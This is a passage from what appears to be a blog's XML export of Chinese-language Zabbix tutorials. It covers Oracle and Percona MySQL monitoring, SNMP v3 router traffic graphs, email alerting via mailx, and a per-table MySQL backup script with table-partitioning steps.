&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;证明没有问题了，然后需要在zabbix_server的web端添加模板，这个模板在下载的pyora压缩包里面有一个半成品的模板，这个模板是个不完整的半成品，需要自己完成剩下的配置我这里稍后也会打包放上我这边进行部分修改后的模板上来。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加主机并添加模板，这时候需要注意，因为这个模板中使用了宏变量，所以在添加主机的时候需要设定相应的宏变量，下面是设定宏变量的截图： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设定好宏之后，等待一段时间（ps:一般5到十分钟就能够正常的产生数据了），下面是获取到的监控数据的截图： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好了，至此，简单的oracle监控已经结束了，至于更多的监控需求，各位可以依据自己的需求进行适当的修改脚本，以达到各位的要求。]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix使用percona zabbix mysql-plugin监控mysql数据库]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F22.%20zabbix%E4%BD%BF%E7%94%A8percona%20zabbix%20mysql-plugin%E7%9B%91%E6%8E%A7mysql%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[zabbix使用percona zabbix mysql-plugin监控mysql数据库&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于zabbix自带的mysql监控模板监控的东西比较少，使用percona zabbix mysql-plugin实现对mysql的监控。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;percona zabbix mysql-plugin是percona发布的一个使用zabbix监控mysql数据库的工具，这款工具比zabbix自带的监控模板要强大的多，毕竟percona是Mysql的一个重要分支，专业做数据库的，所以，采集的数据比较全面。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面开始进入正题，部署mysql的监控。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，需要安装安装php和php-mysql，因为用到了php脚本，所以在本机上面需要安装php，至于php的安装不是本文讨论的重点 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后，需要去percona官网下载最新版本的percona zabbix mysql-plugin，从1.1版本开始起支持zabbix，包括cacti，nagios也都有接口提供，这里下载的是percona zabbix mysql-plugin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载后安装 1rpm -ivh percona-zabbix-templates-1.1.5-1.noarch.rpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装完毕后会产生两个目录，每个目录有两个文件，详细结果如下所示： 123456[root@test2 ~]# ls /var/lib/zabbix/percona/scripts templates[root@test2 ~]# ls /var/lib/zabbix/percona/scripts/get_mysql_stats_wrapper.sh ss_get_mysql_stats.php[root@test2 ~]# ls /var/lib/zabbix/percona/templates/userparameter_percona_mysql.conf zabbix_agent_template_percona_mysql_server_ht_2.0.9-sver1.1.5.xml &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，需要下载模版文件zabbix_agent_template_percona_mysql_server_ht_2.0.9-sver1.1.5.xml然后将这个模 板文件导入到zabbixweb端的模板中去，然后将配置文 userparameter_percona_mysql.conf放入到zabbix的配置文件目录中，我这的目录 是/usr/local/zabbix-2.4.4/etc/zabbix_agentd.conf.d/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后修改zabbix_agentd.conf配置文件，将配置文件所在目录添加进去，也就是添加下面这行语句： 1Include=/usr/local/zabbix-2.4.4/etc/zabbix_agentd.conf.d/*.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后修改脚本，首先修改sh脚本，也就是get_mysql_stats_wrapper.sh这个脚本，将下面这条语句进行修改： 1RES=`HOME=~zabbix mysql -e 'SHOW SLAVE STATUS\G' | egrep '(Slave_IO_Running|Slave_SQL_Running):' | awk -F: '&#123;print $2&#125;' | tr '\n' ','` &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为： 1RES=`/usr/local/mysql/bin/mysql -uroot -e 'SHOW SLAVE STATUS\G' | egrep '(Slave_IO_Running|Slave_SQL_Running):' | awk -F: '&#123;print $2&#125;' | tr '\n' ','` &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里Mysql没有设置root密码，可以在这里写入mysql的相应账号密码。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有需要注意，在这个脚本中需要调用php来实现监控，所以需要修改php的路径，我的php的路径为/usr/local/php/bin/php，所以将脚本中的那条命令修改成下面这样： 1CMD="/usr/local/php/bin/php -q $DIR/ss_get_mysql_stats.php --host $HOST --items gg" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之后保存该脚本，并修改权限为755然后修改php脚本文件，修改用户名和密码如下： 123$mysql_user = 'root';$mysql_pass = '';$mysql_port = 3306; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为mysqlroot密码是空的，所以这里密码是没有输入的，可以修改成相应的账号密码。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改完之后保存配置并将权限设置为755，然后重启zabbix_agentd，在zabbix_server端添加刚刚我们导入进去的模板，就可以实现mysql的监控了，下面是监控的效果图： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是貌似这个模板对于单个数据库虽然足够详细，对于数据库集群的监控还是不够给力，需要在其监控脚本的基础上进行修改，使其能够监控到数据库集群的状态信息那就更好了，当然，我这里只做了单个数据库的监控，集群由于没有实际部署，这里也就没有进行演示了，对这方面感兴趣的童鞋们可以自行阅读脚本源代码，对脚本进行修改以便于实现mysql集群的详细监控。]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix使用SNMP V3监控路由器接口流量]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F21.%20zabbix%E4%BD%BF%E7%94%A8SNMP%20V3%E7%9B%91%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8%E6%8E%A5%E5%8F%A3%E6%B5%81%E9%87%8F%2F</url>
    <content type="text"><![CDATA[zabbix使用SNMP V3监控路由器接口流量&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于有需要监控网络流量， 于是，部署了zabbix监控路由器流量的应用，下面是通过查找资料，自行实验并成功监控路由器接口流量的过程。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，在路由器上面配置好SNMP协议，我这边配置的是SNMP V3版本协议，并且使用了加密认证的方式(用户名：test认证算法使用SHA-1，密码：abcdefg加密密码使用AES协议，密码：hijklmnopq)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置完之后需要进行检测看能否通过SNMP协议从路由器上面获取数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过在zabbi服务器上面使用snmpwalk，snmpget等工具来尝试获取路由器信息，要使用这两个工具需要先安装net-snmp net-snmp-utils这两个包，才能使用snmpwalk,snmpget等工具测试snmp访问。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装完成之后开始调用snmpwalk命令来获取snmp协议的数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SNMP V3认证使用方法 1snmpwalk -v 3 -u test -a sha -A abcdefg -x AES -X hijklmnopq -l authPriv 192.168.1.1 interfaces.ifTable.ifEntry.ifOutOctets（或者使用OID号） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中-v选择版本号 -u用户名 -a认证算法为SHA-1 -A认证密码为abcdefg -x加密协议为AES -X加密密码为hijklmnopq -l authPriv启用认证和加密功能 interfaces.ifTable.ifEntry.ifOutOctets（查看接口出去的流量） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于一些常用的公共的OID号可以百度一下，下面也列出了一些常用的OID号： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常用SNMPOID号 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157Variable Descriptor Object Identifier System Group sysDescr 1.3.6.1.2.1.1.1 sysObjectID 1.3.6.1.2.1.1.2 sysUpTime 1.3.6.1.2.1.1.3 sysContact 1.3.6.1.2.1.1.4 sysName 1.3.6.1.2.1.1.5 sysLocation 1.3.6.1.2.1.1.6 sysServices 1.3.6.1.2.1.1.7 interfaces Group ifNumber 1.3.6.1.2.1.2.1 ifTable 1.3.6.1.2.1.2.2 ifEntry 1.3.6.1.2.1.2.2.1 ifIndex 1.3.6.1.2.1.2.2.1.1 ifDescr 1.3.6.1.2.1.2.2.1.2 ifType 1.3.6.1.2.1.2.2.1.3 ifMtu 1.3.6.1.2.1.2.2.1.4 ifSpeed 1.3.6.1.2.1.2.2.1.5 ifPhysAddress 1.3.6.1.2.1.2.2.1.6 ifAdminStatus 1.3.6.1.2.1.2.2.1.7 ifOperStatus 1.3.6.1.2.1.2.2.1.8 ifLastChange 1.3.6.1.2.1.2.2.1.9 ifInOctets 1.3.6.1.2.1.2.2.1.10 ifInUcastPkts 1.3.6.1.2.1.2.2.1.11 ifInNUcastPkts 1.3.6.1.2.1.2.2.1.12 ifInDiscards 1.3.6.1.2.1.2.2.1.13 ifInErrors 1.3.6.1.2.1.2.2.1.14 ifInUnknownProtos 1.3.6.1.2.1.2.2.1.15 ifOutOctets 1.3.6.1.2.1.2.2.1.16 ifOutUcastPkts 1.3.6.1.2.1.2.2.1.17 ifOutNUcastPkts 1.3.6.1.2.1.2.2.1.18 ifOutDiscards 1.3.6.1.2.1.2.2.1.19 ifOutErrors 1.3.6.1.2.1.2.2.1.20 ifOutQLen 1.3.6.1.2.1.2.2.1.21 ifSpecific 1.3.6.1.2.1.2.2.1.22 IP Group ipForwarding 1.3.6.1.2.1.4.1 ipDefaultTTL 1.3.6.1.2.1.4.2 ipInReceives 1.3.6.1.2.1.4.3 ipInHdrErrors 1.3.6.1.2.1.4.4 ipInAddrErrors 1.3.6.1.2.1.4.5 ipForwDatagrams 1.3.6.1.2.1.4.6 ipInUnknownProtos 1.3.6.1.2.1.4.7 ipInDiscards 1.3.6.1.2.1.4.8 ipInDelivers 1.3.6.1.2.1.4.9 ipOutRequests 1.3.6.1.2.1.4.10 ipOutDiscards 1.3.6.1.2.1.4.11 ipOutNoRoutes 1.3.6.1.2.1.4.12 ipReasmTimeout 1.3.6.1.2.1.4.13 ipReasmReqds 1.3.6.1.2.1.4.14 ipReasmOKs 1.3.6.1.2.1.4.15 ipReasmFails 1.3.6.1.2.1.4.16 ipFragsOKs 1.3.6.1.2.1.4.17 ipFragsFails 1.3.6.1.2.1.4.18 ipFragCreates 1.3.6.1.2.1.4.19 ipAddrTable 1.3.6.1.2.1.4.20 ipAddrEntry 1.3.6.1.2.1.4.20.1 ipAdEntAddr 1.3.6.1.2.1.4.20.1.1 ipAdEntIfIndex 1.3.6.1.2.1.4.20.1.2 ipAdEntNetMask 1.3.6.1.2.1.4.20.1.3 ipAdEntBcastAddr 1.3.6.1.2.1.4.20.1.4 ipAdEntReasmMaxSize 1.3.6.1.2.1.4.20.1.5 ICMP Group icmpInMsgs 1.3.6.1.2.1.5.1 icmpInErrors 1.3.6.1.2.1.5.2 icmpInDestUnreachs 1.3.6.1.2.1.5.3 icmpInTimeExcds 1.3.6.1.2.1.5.4 icmpInParmProbs 1.3.6.1.2.1.5.5 icmpInSrcQuenchs 1.3.6.1.2.1.5.6 icmpInRedirects 1.3.6.1.2.1.5.7 icmpInEchos 1.3.6.1.2.1.5.8 icmpInEchoReps 1.3.6.1.2.1.5.9 icmpInTimestamps 1.3.6.1.2.1.5.10 icmpInTimestampReps 1.3.6.1.2.1.5.11 icmpInAddrMasks 1.3.6.1.2.1.5.12 icmpInAddrMaskReps 1.3.6.1.2.1.5.13 icmpOutMsgs 1.3.6.1.2.1.5.14 icmpOutErrors 1.3.6.1.2.1.5.15 icmpOutDestUnreachs 1.3.6.1.2.1.5.16 icmpOutTimeExcds 1.3.6.1.2.1.5.17 icmpOutParmProbs 1.3.6.1.2.1.5.18 icmpOutSrcQuenchs 1.3.6.1.2.1.5.19 icmpOutRedirects 1.3.6.1.2.1.5.20 icmpOutEchos 1.3.6.1.2.1.5.21 icmpOutEchoReps 1.3.6.1.2.1.5.22 icmpOutTimestamps 1.3.6.1.2.1.5.23 icmpOutTimestampReps 1.3.6.1.2.1.5.24 icmpOutAddrMasks 1.3.6.1.2.1.5.25 icmpOutAddrMaskReps 1.3.6.1.2.1.5.26 TCP Group tcpRtoAlgorithm 1.3.6.1.2.1.6.1 tcpRtoMin 1.3.6.1.2.1.6.2 tcpRtoMax 1.3.6.1.2.1.6.3 tcpMaxConn 1.3.6.1.2.1.6.4 tcpActiveOpens 1.3.6.1.2.1.6.5 tcpPassiveOpens 1.3.6.1.2.1.6.6 tcpAttemptFails 1.3.6.1.2.1.6.7 tcpEstabResets 1.3.6.1.2.1.6.8 tcpCurrEstab 1.3.6.1.2.1.6.9 tcpInSegs 1.3.6.1.2.1.6.10 tcpOutSegs 1.3.6.1.2.1.6.11 tcpRetransSegs 1.3.6.1.2.1.6.12 tcpConnTable 1.3.6.1.2.1.6.13 tcpConnEntry 1.3.6.1.2.1.6.13.1 tcpConnState 1.3.6.1.2.1.6.13.1.1 tcpConnLocalAddress 1.3.6.1.2.1.6.13.1.2 tcpConnLocalPort 1.3.6.1.2.1.6.13.1.3 tcpConnRemAddress 1.3.6.1.2.1.6.13.1.4 tcpConnRemPort 1.3.6.1.2.1.6.13.1.5 tcpInErrs 1.3.6.1.2.1.6.14 tcpOutRsts 1.3.6.1.2.1.6.15 UDP Group udpInDatagrams 1.3.6.1.2.1.7.1 udpNoPorts 1.3.6.1.2.1.7.2 udpInErrors 1.3.6.1.2.1.7.3 udpOutDatagrams 1.3.6.1.2.1.7.4 udpTable 1.3.6.1.2.1.7.5 udpEntry 1.3.6.1.2.1.7.5.1 udpLocalAddress 1.3.6.1.2.1.7.5.1.1 udpLocalPort 1.3.6.1.2.1.7.5.1.2 SNMP Group snmpInPkts 1.3.6.1.2.1.11.1 snmpOutPkts 1.3.6.1.2.1.11.2 snmpInBadVersions 1.3.6.1.2.1.11.3 snmpInBadCommunityNames 1.3.6.1.2.1.11.4 snmpInBadCommunityUses 1.3.6.1.2.1.11.5 snmpInASNParseErrs 1.3.6.1.2.1.11.6 NOT USED 1.3.6.1.2.1.11.7 snmpInTooBigs 1.3.6.1.2.1.11.8 snmpInNoSuchNames 1.3.6.1.2.1.11.9 snmpInBadValues 1.3.6.1.2.1.11.10 snmpInReadOnlys 1.3.6.1.2.1.11.11 snmpInGenErrs 1.3.6.1.2.1.11.12 snmpInTotalReqVars 1.3.6.1.2.1.11.13 snmpInTotalSetVars 1.3.6.1.2.1.11.14 snmpInGetRequests 1.3.6.1.2.1.11.15 snmpInGetNexts 1.3.6.1.2.1.11.16 snmpInSetRequests 1.3.6.1.2.1.11.17 snmpInGetResponses 1.3.6.1.2.1.11.18 snmpInTraps 1.3.6.1.2.1.11.19 snmpOutTooBigs 1.3.6.1.2.1.11.20 snmpOutNoSuchNames 1.3.6.1.2.1.11.21 snmpOutBadValues 1.3.6.1.2.1.11.22 NOT USED 1.3.6.1.2.1.11.23 snmpOutGenErrs 1.3.6.1.2.1.11.24 snmpOutGetRequests 1.3.6.1.2.1.11.25 snmpOutGetNexts 1.3.6.1.2.1.11.26 snmpOutSetRequests 1.3.6.1.2.1.11.27 snmpOutGetResponses 1.3.6.1.2.1.11.28 snmpOutTraps 1.3.6.1.2.1.11.29 snmpEnableAuthenTraps 1.3.6.1.2.1.11.30 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SNMP抓包有结果后就可以在zabbix的配置页面上面开始配置添加路由器了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，添加一台主机，主机使用snmp协议 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后创建一个应用集，名字叫做interfacetraffic &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在该应用集下面创建项目，其中键值和SNMP OID要一致，类型选择SNMPV3 代理程式，安全名称就是用户名，安全级别使用authpriv就是基于认证和加密的SNMPV3，我这里使用的是SHA认证，所以选中SHA，填写SHA密码，我这选的是AES加密密码，所以也要选中AES加密，并在下面输入密码，另外注意单位，我这使用的是bps，因为SNMP取到的是字节为单位，这里改成bps的单位时候需要将源数据乘8，这里选中的是使用自定倍数，值填写为8，最后还得注意储存量得改为差量（每秒速率），因为SNMP获取到的接口流量是累加的，所以获取到的值也是累加的，这里调成差量（每秒速率）将使用后一次取到的值减去前一次取到的值，然后除以中间相差的秒数，这才是真正的改时间段平均带宽。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面只是创建好了一个接口的入口流量，按照这个模板修改，可以添加多个接口的出入口流量监控项。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建完监控项之后就可以生成图表了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面是生成图表的过程： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样，就可以监控该路由器的G0/0的出入流量了，截图如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;至此，该教程文档完结，在配置过程中若碰到了一些其他问题可以百度或者谷歌查找资料解决]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix设置邮件报警]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F20.%20zabbix%E8%AE%BE%E7%BD%AE%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6%2F</url>
    <content type="text"><![CDATA[zabbix设置邮件报警一、首先安装mailx组件并配置好能够通过三方邮箱发送邮件1yum install mailx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后编辑mailx的配置文件 1vi /etc/mail.rc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在最末尾添加如下信息 123set from=xxxxxx@qq.com smtp=smtp.qq.comset smtp-auth-user=xxxxxx@qq.com smtp-auth-password=xxxxxxset smtp-auth=login &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存退出后测试邮件是否能够正常发送出去 1echo "zabbix test mail" |mail -s "zabbix" xxx@163.com 二、配置Zabbix服务端邮件报警1、打开Zabbix&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;管理-示警媒介类型-创建媒体类型 名称：Sendmail类型：脚本脚本名称：sendmail.sh已启用：勾选存档 2、设置Zabbix用户报警邮箱地址&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;管理-用户-Admin (Zabbix Administrator) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;切换到示警媒介-添加 类型：Sendmail收件人：xxx@163.com其他默认即可，也可以根据需要设置状态：已启用存档 3、设置Zabbix触发报警的动作&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;组态-动作-创建动作 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，下面的默认接收人那一栏中需要添加（默认接收人：）这个字段，否则将可能导致邮件中文乱码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认接收人：默认接收人：故障{TRIGGER.STATUS},服务器:{HOSTNAME1}发生: {TRIGGER.NAME}故障! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认信息：告警主机:{HOSTNAME1}告警时间:{EVENT.DATE} {EVENT.TIME}告警等级:{TRIGGER.SEVERITY}告警信息: {TRIGGER.NAME}告警项目:{TRIGGER.KEY1}问题详情:{ITEM.NAME}:{ITEM.VALUE}当前状态:{TRIGGER.STATUS}:{ITEM.VALUE1}事件ID:{EVENT.ID}恢复信息：打钩 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，下面的恢复主旨那一栏中需要添加（恢复主旨：）这个字段，否则将可能导致邮件中文乱码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;恢复主旨：恢复主旨：恢复{TRIGGER.STATUS}, 服务器:{HOSTNAME1}: {TRIGGER.NAME}已恢复! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;恢复信息：告警主机:{HOSTNAME1}告警时间:{EVENT.DATE} {EVENT.TIME}告警等级:{TRIGGER.SEVERITY}告警信息: {TRIGGER.NAME}告警项目:{TRIGGER.KEY1}问题详情:{ITEM.NAME}:{ITEM.VALUE}当前状态:{TRIGGER.STATUS}:{ITEM.VALUE1}事件ID:{EVENT.ID}已启用：打钩 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;切换到操作选项 新的操作类型：送出信息送到用户：添加默认信息：打钩选择用户：Admin选择仅送到：Sendmail存档 4、添加Zabbix服务端邮件发送脚本123456789cd/usr/local/zabbix-2.4.4/scripts #进入脚本存放目录vi sendmail.sh #编辑，添加以下代码#!/bin/sh#export LANG=zh_CN.UTF-8 #该命令能够解决发送的中文变成了乱码的问题echo "$3" | mail -s "$2"$1:wq! #保存退出chown zabbix.zabbix /usr/local/zabbix-2.4.4/scripts/sendmail.sh #设置脚本所有者为zabbix用户chmod +x /usr/local/zabbix-2.4.4/scripts/sendmail.sh #设置脚本执行权限 5、设置zabbix_server服务调用脚本的目录1vim/usr/local/zabbix-2.4.4/etc/zabbix_server.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;进入zabbix_server配置文件 1AlertScriptsPath=/usr/local/zabbix-2.4.4/scripts &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;找到上面这一行，将脚本存放目录写到此处 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存并重启zabbix_server服务 三、测试Zabbix报警&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关闭Zabbix客户端服务 1service zabbix_agentd stop &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看xxx@163.com邮箱，会收到报警邮件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再开启Zabbix客户端服务 1service zabbix_agentd start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看xxx@163.com邮箱，会收到恢复邮件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用外部邮箱账号发送报警邮件设置完成。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;至此，Zabbix邮件报警设置完成。]]></content>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zabbix进行数据库备份以及表分区]]></title>
    <url>%2F2017%2F08%2F17%2FZabbix%2F19.%20zabbix%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E4%BB%A5%E5%8F%8A%E8%A1%A8%E5%88%86%E5%8C%BA%2F</url>
    <content type="text"><![CDATA[zabbix进行数据库备份以及表分区&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于测试环境上面使用的zabbix服务器配置比较低，经常会遇到性能瓶颈（主要是数据库和磁盘I/O等），于是倒逼我使用了一些方式来缓解这些问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要是以前使用的那个备份数据库的脚本是对zabbix数据库进行全备的，使用的又是mysql自带的工具mysqldump，当数据量大了之后进行全备所花的时间比较长，这样将会造成数据库的锁读。。。从而使zabbix服务以为mysql死掉了，产生一大堆的报警。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后来发现原来造成数据库数据量大量增加的是zabbix数据库中的一些存储数据的大表导致的。于是备份数据库的时候可以选择跳过这些表进行备份，这样，将大大减少数据库备份所花的时间（PS：之前备份数据库所花时间在十分钟左右，现在跳过大表备份，所花时间在1S左右就能备份完，大大缩短了备份数据库时间）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面就贴出某位大神写的专门为zabbix数据库做备份以及恢复的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/bin/bash#author: itnihaored='\e[0;31m' # 红色 RED='\e[1;31m' green='\e[0;32m' # 绿色 GREEN='\e[1;32m' blue='\e[0;34m' # 蓝色 BLUE='\e[1;34m' purple='\e[0;35m' # 紫色 PURPLE='\e[1;35m' NC='\e[0m' # 没有颜色 source /etc/bashrcsource /etc/profileMySQL_USER=zabbixMySQL_PASSWORD=zabbixMySQL_HOST=localhostMySQL_PORT=3306MySQL_DUMP_PATH=/opt/backupMYSQL_BIN_PATH=/opt/software/mysql/bin/mysqlMYSQL_DUMP_BIN_PATH=/opt/software/mysql/bin/mysqldumpMySQL_DATABASE_NAME=zabbixDATE=$(date '+%Y%m%d')MySQLDUMP () &#123; [ -d $&#123;MySQL_DUMP_PATH&#125; ] || mkdir $&#123;MySQL_DUMP_PATH&#125; cd $&#123;MySQL_DUMP_PATH&#125; [ -d logs ] || mkdir logs [ -d $&#123;DATE&#125; ] || mkdir $&#123;DATE&#125; cd $&#123;DATE&#125; #TABLE_NAME_ALL=$($&#123;MYSQL_BIN_PATH&#125; -u$&#123;MySQL_USER&#125; -p$&#123;MySQL_PASSWORD&#125; -h$&#123;MySQL_HOST&#125; $&#123;MySQL_DATABASE_NAME&#125; -e "show tables"|egrep -v "(Tables_in_zabbix)") TABLE_NAME_ALL=$($&#123;MYSQL_BIN_PATH&#125; -u$&#123;MySQL_USER&#125; -p$&#123;MySQL_PASSWORD&#125; -h$&#123;MySQL_HOST&#125; $&#123;MySQL_DATABASE_NAME&#125; -e "show tables"|egrep -v "(Tables_in_zabbix|history*|trends*|acknowledges|alerts|auditlog|events|service_alarms)") for TABLE_NAME in $&#123;TABLE_NAME_ALL&#125; do $&#123;MYSQL_DUMP_BIN_PATH&#125; --opt -u$&#123;MySQL_USER&#125; -p$&#123;MySQL_PASSWORD&#125; -P$&#123;MySQL_PORT&#125; -h$&#123;MySQL_HOST&#125; $&#123;MySQL_DATABASE_NAME&#125; $&#123;TABLE_NAME&#125; &gt;$&#123;TABLE_NAME&#125;.sql sleep 0.01 done [ "$?" == 0 ] &amp;&amp; echo "$&#123;DATE&#125;: Backup zabbix succeed" &gt;&gt; $&#123;MySQL_DUMP_PATH&#125;/logs/ZabbixMysqlDump.log [ "$?" != 0 ] &amp;&amp; echo "$&#123;DATE&#125;: Backup zabbix not succeed" &gt;&gt; $&#123;MySQL_DUMP_PATH&#125;/logs/ZabbixMysqlDump.log cd $&#123;MySQL_DUMP_PATH&#125;/ rm -rf $(date +%Y%m%d --date='5 days ago') exit 0&#125;MySQLImport () &#123; cd $&#123;MySQL_DUMP_PATH&#125; DATE=$(ls $&#123;MySQL_DUMP_PATH&#125; |egrep "\b^[0-9]+$\b") echo -e "$&#123;green&#125;$&#123;DATE&#125;" echo -e "$&#123;blue&#125;what DATE do you want to import,please input date:$&#123;NC&#125;" read SELECT_DATE if [ -d "$&#123;SELECT_DATE&#125;" ];then echo -e "you select is $&#123;green&#125;$&#123;SELECT_DATE&#125;$&#123;NC&#125;, do you want to contine,if,input $&#123;red&#125;(yes|y|Y)$&#123;NC&#125;,else then exit" read Input [[ 'yes|y|Y' =~ "$&#123;Input&#125;" ]] status="$?" if [ "$&#123;status&#125;" == "0" ];then echo "now import SQL....... Please wait......." else exit 1 fi cd $&#123;SELECT_DATE&#125; for PER_TABEL_SQL in $(ls *.sql) do $&#123;MYSQL_BIN_PATH&#125; -u$&#123;MySQL_USER&#125; -p$&#123;MySQL_PASSWORD&#125; -h$&#123;MySQL_HOST&#125; $&#123;MySQL_DATABASE_NAME&#125; &lt; $&#123;PER_TABEL_SQL&#125; echo -e "import $&#123;PER_TABEL_SQL&#125; $&#123;PURPLE&#125;........................$&#123;NC&#125;" done echo "Finish import SQL,Please check Zabbix database" else echo "Don't exist $&#123;SELECT_DATE&#125; DIR" fi&#125;case "$1" inMySQLDUMP|mysqldump) MySQLDUMP ;;MySQLImport|mysqlimport) MySQLImport ;;*) echo "Usage: $0 &#123;(MySQLDUMP|mysqldump) (MySQLImport|mysqlimport)&#125;" ;;esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该脚本源出处在这https://github.com/itnihao/zabbix-book/blob/master/03-chapter/Zabbix_MySQLdump_per_table_v2.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是在大神的脚本上做了修改之后形成的适合我自己备份的脚本，各位也可以自行修改成适合自己的备份脚本。这个脚本实现的效果上面已经说了，之前做全备的时候差不多有4G左右的数据量，现在只备份配置文件数据量只有不到10M，果断大大节省时间以及空间呀。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不过这样的话将无法保证数据的备份，目前考虑使用xtradbbackup对数据进行增量备份，目前还未实现，留待过两天做吧。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好了，关于数据库备份的事情搞了，然后还需要对大数据量的表进行表分区，参考了zabbix官网的一篇文章https://www.zabbix.org/wiki/Docs/howto/mysql_partition 各位有兴趣的话可以去看看，我这里将其总结在了一起，更加方便一点。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表分区可以对大数据量的表进行物理上的拆分成多个文件，但是逻辑上来看，还是一张表，对应用程序是透明的。另外，将这一张大表拆分成很多小表的话将使得数据查询速度能够更快。还可以随时删除旧的数据分区，删除过期数据。这种方式适用于大数据量的表，但是查询量比较少的应用场景。如果是大数据量的表，又有大量查询的话建议还是进行分库分表操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，登录数据库(PS:这个就不演示了) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后登陆到zabbix库中修改两张表的结构： 123use zabbix;Alter table history_text drop primary key, add index (id), drop index history_text_2, add index history_text_2 (itemid, id);Alter table history_log drop primary key, add index (id), drop index history_log_2, add index history_log_2 (itemid, id); 